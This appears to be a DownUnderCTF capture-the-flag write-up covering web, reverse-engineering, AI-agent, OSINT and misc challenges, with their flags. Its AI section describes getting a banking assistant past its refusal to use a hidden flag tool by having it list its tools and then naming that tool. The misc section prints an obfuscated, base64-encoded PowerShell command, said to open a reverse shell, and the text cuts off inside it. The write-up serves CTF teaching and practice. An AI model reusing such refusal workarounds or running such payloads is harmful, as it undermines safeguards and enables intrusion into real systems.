1  codes = [85, 87, 77, 67, 40, 82, 82, 70, 78, 39, 95, 89, 67, 73, 34, 68, 68,
2  92, 84, 57, 70, 87, 95, 77, 75]
3
4  decoded_chars = []
5  for i, c in enumerate(codes):
6      decoded_char = chr(c ^ (i + 1))
7      decoded_chars.append(decoded_char)
8
9  decoded_string = ''.join(decoded_chars)
10 print(decoded_string)
   # Output: TUNG-TUNG-TUNG-TUNG-SAHUR
SStteepp 33:: UUssee tthhee ddeeccooddeedd AAPPII kkeeyy ttoo rreettrriieevvee tthhee ffllaagg
1 curl -X POST https://web-mini-me-ab6d19a7ea6e.2025.ductf.net/admin/flag \
2      -H "X-API-Key: TUNG-TUNG-TUNG-TUNG-SAHUR"
FFllaagg:: DUCTF{Cl13nt-S1d3-H4ck1nG-1s-FuN}
_[_b_r_a_i_n_ _r_o_t_]
===============================================================================
?🔍 RReevveerrssee EEnnggiinneeeerriinngg
CChhaalllleennggee 11:: RRoocckkyy
SSoollvveess:: 522
CCaatteeggoorriieess:: rev
DDeessccrriippttiioonn
     An underdog boxer gets a once-in-a-lifetime shot at the world
     heavyweight title and proves his worth through sheer determination.
RReeccoonnnnaaiissssaannccee
1 # Test the binary
2 ./rocky
3 Enter input: randomstring
4 Hash mismatch :(
The binary prompts for input and performs some kind of hash comparison. Let’s
analyze it with reverse engineering tools.
VVuullnneerraabbiilliittyy AAsssseessssmmeenntt
Using Ghidra to decompile the binary, we find the main function:
1  undefined8 main(void)
2  {
3    int iVar1;
4    size_t sVar2;
5    undefined1 local_68 [32];
6    undefined1 local_48 [16];
7    char local_38 [32];
8    undefined8 local_18;
9    undefined8 local_10;
10
11   local_18 = 0xd2f969f60c4d9270;
12   local_10 = 0x1f35021256bdca3c;
13   printf("Enter input: ");
14   fgets(local_38,0x11,stdin);
15   sVar2 = strcspn(local_38,"\n");
16   local_38[sVar2] = '\0';
17   md5String(local_38,local_48);
18   iVar1 = memcmp(&local_18,local_48,0x10);
19   if (iVar1 == 0) {
20     puts("Hash matched!");
21     reverse_string(local_38,local_68);
22     decrypt_bytestring(local_38,local_68);
23   }
24   else {
25     puts("Hash mismatch :(");
26   }
27   return 0;
28 }
AAnnaallyyssiiss::
   1. The program stores two 64-bit values: 0xd2f969f60c4d9270 and
      0x1f35021256bdca3c
   2. It takes user input and calculates its MD5 hash
   3. It compares the input’s MD5 hash with the stored values
   4. If they match, it calls reverse_string() and decrypt_bytestring()
      functions
The vulnerability is that the expected MD5 hash is hardcoded in the binary and
can be extracted for cracking.
EExxppllooiittaattiioonn
SStteepp 11:: EExxttrraacctt tthhee MMDD55 hhaasshh ffrroomm tthhee hhaarrddccooddeedd vvaalluueess
1  import struct
2
3  # Original 64-bit values (little-endian from Ghidra)
4  first = 0xd2f969f60c4d9270
5  second = 0x1f35021256bdca3c
6
7  # Convert to bytes in little-endian format
8  first_bytes = struct.pack('<Q', first)  # '<Q' means little-endian 64-bit
9  second_bytes = struct.pack('<Q', second)
10
11 # Combine and convert to hex
12 md5_hash = (first_bytes + second_bytes).hex()
13 print(md5_hash)  # Output: 70924d0cf669f9d23ccabd561202351f
SStteepp 22:: CCrraacckk tthhee MMDD55 hhaasshh
Using an online MD5 cracking service like CrackStation:
1 70924d0cf669f9d23ccabd561202351f => emergencycall911
SStteepp 33:: RRuunn tthhee bbiinnaarryy wwiitthh tthhee ccrraacckkeedd iinnppuutt
1 ./rocky
2 Enter input: emergencycall911
3 Hash matched!
4 DUCTF
  {In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}
FFllaagg:: DUCTF
{In_the_land_of_cubicles_lined_in_gray_Where_the_clock_ticks_loud_by_the_light_of_day}
_[_r_e_v_]
CChhaalllleennggee 22:: SSkkiippppyy
SSoollvveess:: 313
CCaatteeggoorriieess:: rev
DDeessccrriippttiioonn
     Skippy seems to be in a bit of trouble skipping over some sandwiched
     functions. Help skippy get across with a hop, skip and a jump!
RReeccoonnnnaaiissssaannccee
1 # Check file type
2 file skippy.exe
3 skippy.exe: PE32+ executable (console) x86-64, for MS Windows, 19 sections
This is a Windows PE executable that we need to reverse engineer. Let’s analyze
it with a disassembler.
VVuullnneerraabbiilliittyy AAsssseessssmmeenntt
Using Ghidra to decompile the binary, we can see the program structure:
MMaaiinn FFuunnccttiioonn::
1  int main(int *Argc, char ***Argv, char **_Env)
2  {
3    char local_48 [32];  // IV array
4    char local_28 [32];  // Key array
5
6    // Initialize key array with negative values
7    local_28[0] = -0x1a;  // Will become 0x73 after right shift
8    local_28[1] = -0x2a;  // Will become 0x6b after right shift
9    // ... (continues for 16 bytes)
10
11   sandwich(local_28);   // Process key
12
13   // Initialize IV array with negative values
14   local_48[0] = -0x2a;  // Will become 0x6b after right shift
15   local_48[1] = -0x3e;  // Will become 0x61 after right shift
16   // ... (continues for 16 bytes)
17
18   sandwich(local_48);   // Process IV
19   decrypt_bytestring((longlong)local_28,(undefined8 *)local_48);
20   return 0;
21 }
KKeeyy AAnnaallyyssiiss::
   1. The program initializes two arrays with negative byte values
   2. These arrays are processed by the sandwich() function
   3. The sandwich() function calls stone(), then decryptor(), then stone()
      again
   4. The decryptor() function performs a right bit shift operation on each
      byte
   5. Finally, decrypt_bytestring() uses AES-CBC decryption
DDeeccrryyppttoorr FFuunnccttiioonn::
1 void decryptor(longlong param_1)
2 {
3   for (local_10 = 0; local_10 < 0x10; local_10 = local_10 + 1) {
4     *(byte *)(local_10 + param_1) = *(byte *)(local_10 + param_1) >> 1;
5   }
6 }
This function right-shifts each byte by 1 bit, effectively dividing by 2.
EExxppllooiittaattiioonn
SStteepp 11:: CCaallccuullaattee tthhee kkeeyy aanndd IIVV aafftteerr pprroocceessssiinngg
The negative values are stored as two’s complement, and after right-shifting:
1  # Original negative values for key
2  key_raw = [-0x1a, -0x2a, -0x2e, -0x20, -0x20, -0xe, -0x42, -0x18,
3             -0x30, -0x36, -0x42, -0x3c, -0x16, -0x1a, -0x30, -0x42]
4
5  # Original negative values for IV
6  iv_raw = [-0x2a, -0x3e, -0x24, -0x32, -0x3e, -0x1c, -0x22, -0x22,
7            -0x22, -0x22, -0x22, -0x22, -0x22, -0x22, -0x22, -0x22]
8
9  # Convert to unsigned bytes and right shift by 1
10 key = bytes([(256 + x) >> 1 for x in key_raw])
11 iv = bytes([(256 + x) >> 1 for x in iv_raw])
SStteepp 22:: EExxttrraacctt eennccrryypptteedd ddaattaa ffrroomm tthhee bbiinnaarryy
The encrypted data is stored at DAT_14000a000 in the binary (96 bytes).
SStteepp 33:: DDeeccrryypptt uussiinngg AAEESS--CCBBCC
1  from Crypto.Cipher import AES
2
3  # Key and IV (after right-shifting)
4  key = bytes([0x73, 0x6b, 0x69, 0x70, 0x70, 0x79, 0x5f, 0x74,
5               0x68, 0x65, 0x5f, 0x62, 0x75, 0x73, 0x68, 0x5f])
6  iv = bytes([0x6b, 0x61, 0x6e, 0x67, 0x61, 0x72, 0x6f, 0x6f,
7              0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f, 0x6f])
8
9  # Encrypted data (96 bytes from the binary)
10 encrypted_data = bytes.fromhex(
11     "ae27241b7ffd2c8b3265f22ad1b063f0"
12     "915b6b95dcc0eec14de2c563f7715594"
13     "007d2bc75e5d614e5e51190f4ad1fd21"
14     "c5c4b1ab89a4a725c5b8ed3cb3763072"
15     "7b2d2ab722dc9333264725c6b5ddb00d"
16     "d3c3da6313f1e2f4df5180d5f3831843"
17 )
18
19 # Decrypt
20 cipher = AES.new(key, AES.MODE_CBC, iv)
21 decrypted = cipher.decrypt(encrypted_data)
22
23 # Print the decrypted flag
24 print(decrypted.decode('utf-8', errors='ignore'))
FFllaagg:: DUCTF
{There_echoes_a_chorus_enending_and_wild_Laughter_and_gossip_unruly_and_piled}
_[_s_k_i_p_p_y_]
===============================================================================
?🤖 AAII CChhaalllleennggeess
CChhaalllleennggee 11:: dduuccttffbbaannkk 11
SSoollvveess:: 657
CCaatteeggoorryy:: AI
DDeessccrriippttiioonn
     I’m from DownUnderCTF Bank. As part of your company’s business
     relationship with us, we are pleased to offer you a complimentary
     personal banking account with us. A link to our website is below. If
     you have any further queries, please don’t hesitate to contact me!
FFiilleess SSttrruuccttuurree
1 .
2 ├── agent_snip.ts
3 ├── bank_service.ts
4 └── routes
5     ├── ai.ts
6     ├── dashboard.ts
7     ├── layouts.ts
8     └── login.ts
AApppprrooaacchh
This challenge involves interacting with an AI banking assistant that has
access to various tools for managing bank accounts. The key insight comes from
analyzing the provided source code snippets.
From agent_snip.ts, we can see there’s a create_account tool:
1  create_account: tool({
2    description: 'REDACTED',
3    parameters: z.object({
4      nickname: z.string().describe("REDACTED")
5    }),
6    execute: async ({ nickname }) => {
7      const account_number = await svc.createAccount(customerId, nickname);
8      await svc.giveBonus(account_number);
9      return { account_number };
10   }
11 }),
The critical part is in bank_service.ts where the giveBonus function is
defined:
  async giveBonus(account: string) {
1   return this.db.transaction(async () => {
2     const { id } = await this.db.query('SELECT id FROM accounts WHERE
3 number=?').get(account) as { id: number };
4     await this.addTransaction(id, 'DUCTF Bank', `Account opening bonus: $
5 {FLAG_BONUS}`, 1000);
6   })();
  }
This shows that when an account is created, a bonus transaction is
automatically added with the description containing FLAG_BONUS, which likely
contains the flag.
SSoolluuttiioonn
SStteepp 11:: LLooggiinn ttoo tthhee BBaannkkiinngg SSyysstteemm_[_L_o_g_i_n_ _S_c_r_e_e_n_]
LLooggiinn ffoorrmm ffoorr tthhee DDoowwnnUUnnddeerrCCTTFF BBaannkk ssyysstteemm
SStteepp 22:: IInntteerraacctt wwiitthh AAII AAssssiissttaanntt aanndd RReeqquueesstt AAccccoouunntt CCrreeaattiioonn _[_A_c_c_o_u_n_t
_O_v_e_r_v_i_e_w_ _w_i_t_h_ _A_I_ _C_h_a_t_]DDaasshhbbooaarrdd sshhoowwiinngg tthhee AAII aassssiissttaanntt cchhaatt iinntteerrffaaccee..
RReeqquueesstt aaccccoouunntt ccrreeaattiioonn bbyy aasskkiinngg tthhee AAII ttoo ccrreeaattee aa nneeww aaccccoouunntt wwiitthh aannyy
nniicckknnaammee ((ee..gg..,, ?“mmaasstteerr aatt bbaaiittiinngg?”))
SStteepp 33:: VViieeww AAccccoouunntt DDeettaaiillss aanndd TTrraannssaaccttiioonn HHiissttoorryy _[_T_r_a_n_s_a_c_t_i_o_n
_D_e_t_a_i_l_s_]AAccccoouunntt ttrraannssaaccttiioonn ppaaggee sshhoowwiinngg tthhee aaccccoouunntt ooppeenniinngg bboonnuuss ttrraannssaaccttiioonn
ccoonnttaaiinniinngg tthhee ffllaagg
The solution process:
   1. LLooggiinn ttoo tthhee bbaannkkiinngg ssyysstteemm using the provided login form
   2. IInntteerraacctt wwiitthh tthhee AAII aassssiissttaanntt in the chat interface on the right side of
      the dashboard
   3. RReeqquueesstt aaccccoouunntt ccrreeaattiioonn by asking the AI to create a new account with
      any nickname (e.g., “master at baiting”)
   4. CChheecckk tthhee aaccccoouunntt oovveerrvviieeww to see the newly created account with a
      $1000.00 balance
   5. VViieeww tthhee ttrraannssaaccttiioonn ddeettaaiillss to see the account opening bonus transaction
   6. EExxttrraacctt tthhee ffllaagg from the transaction description: Account opening bonus:
      DUCTF{1_thanks_for_banking_with_us_11afebf50e8cfd9f}
The AI assistant automatically calls the create_account tool when prompted,
which triggers the giveBonus function that adds a transaction containing the
flag in its description.
FFllaagg:: DUCTF{1_thanks_for_banking_with_us_11afebf50e8cfd9f}
_[_b_o_b_b_y_]
CChhaalllleennggee 22:: dduuccttffbbaannkk 22
SSoollvveess:: 460
CCaatteeggoorryy:: AI
DDeessccrriippttiioonn
     I heard you had access to a special deal from DownUnderCTF Bank.
     Right now I’m paying $10 a month for my bank account at Commonpoor
     Bank, and it offers me nothing special. Really jealous of the 24/
     7 live agent support. Could you ask your account manager if they have
     any promo codes that you can share?
     NOTE: This challenge uses the same files and service as “ductfbank
     1”.
AApppprrooaacchh
This challenge builds on the first one but requires discovering and accessing a
hidden tool that the AI assistant has access to. The key is understanding that
AI agents often have more capabilities than they initially reveal.
From analyzing agent_snip.ts, we can find a hidden tool:
1 flag: tool({
2   description: 'REDACTED',
3   parameters: z.object({}),
4   execute: async () => {
5     return { message: FLAG_TOOL }
6   }
7 }),
This shows there’s a flag tool that returns FLAG_TOOL when executed, but the AI
assistant (Bobby) initially refuses to use it.
SSoolluuttiioonn
SStteepp 11:: IInniittiiaall AAtttteemmpptt -- DDiirreecctt RReeqquueesstt
_[_B_o_b_b_y_ _R_e_f_u_s_i_n_g_ _F_l_a_g_ _T_o_o_l_]BBoobbbbyy iinniittiiaallllyy rreeffuusseess ttoo uussee tthhee ffllaagg ttooooll,, ssttaattiinngg
hhee ccaannnnoott aassssiisstt wwiitthh ffllaagg ttoooollss oorr sseeccuurriittyy bbyyppaasssseess
_[_m_y_ _r_e_s_p_o_n_s_e_ _t_o_ _B_o_b_b_y_ _R_e_f_u_s_i_n_g_ _F_l_a_g_ _T_o_o_l_ _]
SStteepp 22:: AAsskk AAbboouutt AAvvaaiillaabbllee TToooollss When directly asking “can u use the flag
tool?”, Bobby refuses and explains he cannot assist with flag tools or security
bypasses. However, the solution involves asking Bobby what tools he has access
to.
SStteepp 33:: RReeqquueesstt TTooooll LLiisstt aanndd SSppeecciiffiicc TTooooll UUssaaggee
   1. AAsskk BBoobbbbyy wwhhaatt ttoooollss hhee ccaann uussee - This causes him to list his available
      tools, including the flag tool at the end
   2. SSppeecciiffiiccaallllyy rreeqquueesstt hhiimm ttoo uussee tthhee ffllaagg ttooooll - Once he’s acknowledged
      having access to it, ask him to use that specific tool
   3. EExxttrraacctt tthhee ffllaagg from his response when he executes the flag tool
The key insight is that while Bobby initially refuses to use the flag tool when
asked directly about “flag tools” or “promo codes”, he will use it when you ask
him to demonstrate his available tools and then specifically request the flag
tool by name.
FFllaagg:: DUCTF{2_hidden_tool_0dc9ac14e7ba6a8b}
===============================================================================
?🕵?️ OOSSIINNTT CChhaalllleennggeess
CChhaalllleennggee 11:: LLooookk aatt aallll tthhoossee cchhiicckkeennss!!
SSoollvveess:: 442
CCaatteeggoorryy:: OSINT
DDeessccrriippttiioonn
     Hmmm, it appears this image was sent last year when one of our brave
     hackers went out to follow a lead to save some birds from those nasty
     bugs, but couldn’t reach them! We did have it on good word that they
     were in captivity nearby to the picture that was taken- can you find
     out the name of the place where these birds were locked up?
     NNOOTTEE:: WWee kknnooww wwhheerree tthhee bbiirrddss aarree rriigghhtt nnooww,, ssttoopp tteelllliinngg uuss!! WWee wwaanntt
     ttoo kknnooww wwhheerree tthheeyy wweerree ccaappttiivvee,, nnoott wwhheerree tthheeyy?’rree vviibbiinngg!!
     The flag format is DUCTF{Captivity_Name} (case insensitive) The
     answer is two words
_[_b_i_n_ _c_h_i_c_k_e_n_ _i_s_l_a_n_d_]
IInnvveessttiiggaattiioonn PPrroocceessss
   1. IInniittiiaall IImmaaggee AAnnaallyyssiiss
          o Examined the first image showing a person standing by a flooded
            waterway
          o Noticed distinctive features: eucalyptus trees, urban parkland
            setting, and what appears to be a playground structure visible on
            the left side
          o The setting looked distinctly Australian based on the vegetation
            and landscape
   2. RReevveerrssee IImmaaggee SSeeaarrcchh
          o Used Google reverse image search with the keyword “chicken” to
            identify the location
          o This led to discovering the birds in question were “bin chickens”
            (Australian White Ibis)
          o Found Reddit post identifying this as “Bin Chicken Island” in the
            r/AustralianBirds subreddit
_[_S_c_r_e_e_n_s_h_o_t_ _o_f_ _G_o_o_g_l_e_ _r_e_v_e_r_s_e_ _i_m_a_g_e_ _s_e_a_r_c_h_ _r_e_s_u_l_t_s_]
   1. LLooccaattiioonn IIddeennttiiffiiccaattiioonn
          o Searched for “Bin Chicken Island” on Google Maps
          o Identified the location as Coburg Lake Reserve in Melbourne,
            Australia
          o Confirmed the location by matching distinctive features:
                # The waterway configuration
                # Surrounding parkland and trees
                # Playground structure visible in the original image
_[_G_o_o_g_l_e_ _M_a_p_s_ _v_i_e_w_ _o_f_ _C_o_b_u_r_g_ _L_a_k_e_ _R_e_s_e_r_v_e_]
   1. HHiissttoorriiccaall RReesseeaarrcchh
          o Zoomed out from Coburg Lake Reserve on Google Maps to examine the
            surrounding area
          o Discovered Pentridge Prison located nearby to the north of the
            reserve
          o Research confirmed that Pentridge Prison was a historic
            correctional facility where the “bin chickens” would have been held
            “captive”
_[_G_o_o_g_l_e_ _M_a_p_s_ _s_h_o_w_i_n_g_ _p_r_o_x_i_m_i_t_y_ _o_f_ _P_e_n_t_r_i_d_g_e_ _P_r_i_s_o_n_ _t_o_ _C_o_b_u_r_g_ _L_a_k_e_ _R_e_s_e_r_v_e_]
FFllaagg:: DUCTF{Pentridge_Prison}
_[_b_i_n_ _c_h_i_c_k_e_n_ _]
CChhaalllleennggee 22:: ffaatt ddoonnkkee ddiissss
SSoollvveess:: 714
CCaatteeggoorryy:: OSINT
DDeessccrriippttiioonn
     Dear K4YR0, ain’t no fat donke tryin to spit bars on the fat monke
     Regards, MC Fat Monke
IInnvveessttiiggaattiioonn PPrroocceessss
   1. IInniittiiaall AAnnaallyyssiiss
          o The challenge mentions “MC Fat Monke” as a key figure
          o The message appears to be a diss track or rap battle reference
          o Need to find information about this MC Fat Monke character
   2. SSoocciiaall MMeeddiiaa SSeeaarrcchh
          o Searched for “MC Fat Monke” across various platforms
          o Found a SoundCloud page: https://soundcloud.com/mc-fat-monke
          o This appeared to be the main profile for this character
_[_S_c_r_e_e_n_s_h_o_t_ _o_f_ _M_C_ _F_a_t_ _M_o_n_k_e_ _S_o_u_n_d_C_l_o_u_d_ _p_a_g_e_]
   1. AAuuddiioo CCoonntteenntt AAnnaallyyssiiss
          o Examined the first track on the SoundCloud page
          o Found a description that referenced a YouTube video
          o Description stated: “ya cooked donke, check out my full vid on
            youtube www.youtube.com/watch?v=dWugaNwXjzI”
   2. YYoouuTTuubbee VViiddeeoo IInnvveessttiiggaattiioonn
          o Navigated to the YouTube video link provided
          o Carefully examined the video content frame by frame
          o At timestamp 0:55, discovered a screen showing VS Code with visible
            flag information
_[_S_c_r_e_e_n_s_h_o_t_ _o_f_ _Y_o_u_T_u_b_e_ _v_i_d_e_o_ _a_t_ _0_:_5_5_ _s_h_o_w_i_n_g_ _V_S_ _C_o_d_e_ _w_i_t_h_ _f_l_a_g_]
FFllaagg:: DUCTF{I_HAVE_NOT_THOUGHT_UP_OF_A_FLAG_YET}
_[_m_o_n_k_e_y_]
CChhaalllleennggee 33:: LLoovvee GGrraannnniiEE
SSoollvveess:: [solves]
CCaatteeggoorryy:: OSINT
DDeessccrriippttiioonn
     Hello dear, it’s your Grannie E. My lovely nurse took me out today
     and I found where I used to go see movies! Back in my day movies
     didn’t talk or have sound! How the times have changed. I’ve added in
     a photo from back when I used to live there, with help from my nurse.
     I’m going for a cuppa now, will call later. Love, Grannie E.
     Given the image from Grannie E, can you find the name of the movie
     building, and its current day location? I’ll need a suburb too. NOTE:
     Sometimes old records get out of date, you might need to try the
     street number next door Flag Format: DUCTF
     {BuildingName_StreetAddress_Suburb} (case insensitive) - include the
     street number in the address
IInnvveessttiiggaattiioonn PPrroocceessss
   1. HHiissttoorriiccaall IImmaaggee AAnnaallyyssiiss
          o Examined the black and white photograph showing people at what
            appears to be a train station or bridge
          o The image shows period clothing and architecture consistent with
            early 1900s
          o Notable features include a wooden bridge structure and railway
            infrastructure
          o The reference to silent movies suggests the 1920s era
   2. RReevveerrssee IImmaaggee SSeeaarrcchh
          o Performed a Google reverse image search on the historical
            photograph
          o Found a match in an official NSW Transport document
          o Located the PDF: “Epping-Bridge-Project-Frequently-Asked-Questions-
            for-concept-design-and-Review-of-Environmental-Factors.pdf”
          o The document labeled the image as “Epping Station (Epping Bridge in
            the background) c.1920”
_[_S_c_r_e_e_n_s_h_o_t_ _o_f_ _t_h_e_ _N_S_W_ _T_r_a_n_s_p_o_r_t_ _P_D_F_ _s_h_o_w_i_n_g_ _t_h_e_ _i_m_a_g_e_ _i_d_e_n_t_i_f_i_c_a_t_i_o_n_]
   1. LLooccaattiioonn IIddeennttiiffiiccaattiioonn
          o Established the location as Epping Station area
          o Began searching for historical theatres near Epping Station
          o Focused on venues that would have shown silent films in the 1920s
            era
   2. TThheeaattrree RReesseeaarrcchh
          o Searched for “old theatres near Epping Station”
          o Found Cinema Treasures website with historical theatre records
          o Discovered the Epping Kings Theatre at 46 Beecroft Road, Sydney,
            NSW 2121
          o Link: https://cinematreasures.org/theaters/40752
_[_S_c_r_e_e_n_s_h_o_t_ _o_f_ _C_i_n_e_m_a_ _T_r_e_a_s_u_r_e_s_ _p_a_g_e_ _f_o_r_ _E_p_p_i_n_g_ _K_i_n_g_s_ _T_h_e_a_t_r_e_]
   1. FFllaagg CCoonnssttrruuccttiioonn AAtttteemmppttss
          o First attempt: DUCTF{EppingKingsTheatre_46BeecroftRoad_Epping} -
            IINNCCOORRRREECCTT
          o Researched alternative names for the same venue
          o Found historical records referring to it as “The Cambria Hall”
          o Second attempt: DUCTF{TheCambriaHall_46BeecroftRoad_Epping} -
            IINNCCOORRRREECCTT
   2. AAddddrreessss VVeerriiffiiccaattiioonn
          o Recalled the challenge note: “Sometimes old records get out of
            date, you might need to try the street number next door”
          o Tested with adjacent address number (47 instead of 46)
          o Final attempt: DUCTF{TheCambriaHall_47BeecroftRoad_Epping} -
            CCOORRRREECCTT
FFllaagg:: DUCTF{TheCambriaHall_47BeecroftRoad_Epping}
_[_t_h_e_a_t_r_e_ _m_e_m_e_]
===============================================================================
?🎯 MMiisscceellllaanneeoouuss CChhaalllleennggeess
CChhaalllleennggee 11:: FFiisshhyy WWeebbssiittee
SSoollvveess:: 211
CCaatteeggoorryy:: Misc
DDeessccrriippttiioonn
     Found this fishy website URL on my e-mail and it started to do some
     crazy stuff on my computer. I have captured some network traffic that
     may help you find out what is happening on my computer. Thanks a lot
     for the help!
     FFiilleess pprroovviiddeedd:: capture.pcapng
SSoolluuttiioonn
SStteepp 11:: AAnnaallyyzzee tthhee PPCCAAPP ffiillee Opening the capture.pcapng file, we can find HTTP
requests containing suspicious base64-encoded data. Upon scanning the network
traffic, we discover malicious PowerShell code that establishes a reverse shell
connection.
  powershell -EncodedCommand
1 IAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABCAEIAQgA4ADgAQgA4AEIAOAA4ADgAQgBCAEIAOAA4ACAAPQAgADAAeABmADEALAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAA2AGUALAAKACAAIAAgACAAMAB4AGMAZAAsAAoAIAAwAHgAYwA2ACwAMAB4ADcAOQAsADAAeAA0AGMALAAwAHgANgA2ACwAMAB4AGQAMQAsADAAeAAwADIALAAKACAAIAAgACAAIAAgACAAIAAgACAAMAB4AGYAOAAsADAAeAAzADMALAAwAHgAYwA0ACwAMAB4ADgANgAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeABlADcALAAwAHgAYQA0ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgADAAeAAzADUALAAwAHgAOABkACwACgAgACAAMAB4ADYAOQAsADAAeABiAGQALAAwAHgAZAAyACwAMAB4ADEAZAAsADAAeAA1ADAALAAwAHgAZgA1ACwAMAB4AGYAYgAsADAAeABkAGYALAAwAHgAZQBjACwAMAB4AGEAZgAsAAoAIAAgACAAIAAgADAAeAAwAGIALAAwAHgAOQBlACwAMAB4ADUAMwAsAAoAIAAgACAAIAAwAHgAYQA0ACwAMAB4AGQAMwAKACAAIABmAHUAbgBjAHQAaQBvAG4AIABJAEkAbABJAGwASQBsAEkAbABsAEkASQBsAGwASQBsACAAewAKACAAIAAgACAAIABwAGEAcgBhAG0AKABbAGkAbgB0AFsAXQBdACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgAsACAAWwBpAG4AdABdACQAQgBCADgAQgBCADgAQgA4AEIAQgBCADgAQgA4AEIAOAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAOABCADgAQgA4AEIAOABCADgAQgA4AEIAQgAgAD0AIAAiACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGYAbwByAGUAYQBjAGgAIAAoACQAQgA4ADgAOABCAEIAOAA4ADgAOAA4AEIAQgBCAEIAQgAgAGkAbgAgACQAQgBCAEIAQgA4ADgAOAA4AEIAQgBCAEIAQgA4AEIAQgApACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgA4AEIAOABCADgAQgA4AEIAOABCADgAQgA4AEIAQgAgACsAPQAgAFsAYwBoAGEAcgBdACgAJABCADgAOAA4AEIAQgA4ADgAOAA4ADgAQgBCAEIAQgBCACAALQBiAHgAbwByACAAJABCAEIAOABCAEIAOABCADgAQgBCAEIAOABCADgAQgA4ACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAfQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAAkAEIAOABCADgAQgA4AEIAOABCADgAQgA4AEIAOABCAEIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIABmAHUAbgBjAHQAaQBvAG4AIABsAEkASQBJAGwAbABsAEkASQBJAEkAbABsAGwAbABJACAAewAKACAAIAAgACAAIABwAGEAcgBhAG0AIAAoAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABbAGIAeQB0AGUAWwBdAF0AJABCADgAQgBCAEIAOABCADgAQgBCADgAQgBCAEIAOAA4ACwACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAWwBiAHkAdABlAFsAXQBdACQAQgBCAEIAOABCAEIAQgA4AEIAOAA4AEIAOAA4AEIAOAAKACAAIAAgACAAIAAgACAAIAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOAAgAD0AIAAwAC4ALgAyADUANQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAA9ACAAMAAKACAAIAAgACAAIAAgACAAIAAgACAAIABmAG8AcgAgACgAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAPQAgADAAOwAgACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgAgAC0AbAB0ACAAMgA1ADYAOwAgACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgArACsAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAA9ACAAKAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAArACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCAF0AIAArACAAJABCADgAQgBCAEIAOABCADgAQgBCADgAQgBCAEIAOAA4AFsAJABCADgAQgBCADgAQgBCAEIAOABCAEIAOABCAEIAQgBCACAAJQAgACQAQgA4AEIAQgBCADgAQgA4AEIAQgA4AEIAQgBCADgAOAAuAEwAZQBuAGcAdABoAF0AKQAgACUAIAAyADUANgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAQgBCADgAOABCAEIAOAA4AEIAQgA4AEIAQgBCADgAWwAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAXQAsACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0AIAA9ACAAJABCAEIAQgA4ADgAQgBCADgAOABCAEIAOABCAEIAQgA4AFsAJABCADgAOAA4AEIAOABCAEIAOAA4ADgAQgBCADgAOABCAF0ALAAgACQAQgBCAEIAOAA4AEIAQgA4ADgAQgBCADgAQgBCAEIAOABbACQAQgA4AEIAQgA4AEIAQgBCADgAQgBCADgAQgBCAEIAQgBdAAoAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOABCAEIAOABCAEIAQgA4AEIAQgA4AEIAQgBCAEIAIAA9ACAAMAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAEIAOAA4ADgAQgA4AEIAQgA4ADgAOABCAEIAOAA4AEIAIAA9ACAAMAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAQgBCAEIAQgBCADgAQgBCAEIAOABCAEIAQgA4ADgAQgAgAD0AIABAACgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAEIAQgBCAEIAOAA4ADgAOAA4AEIAOAA4ADgAQgBCAEIAIABpAG4AIAAkAEIAQgBCADgAQgBCAEIAOABCADgAOABCADgAOABCADgAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAI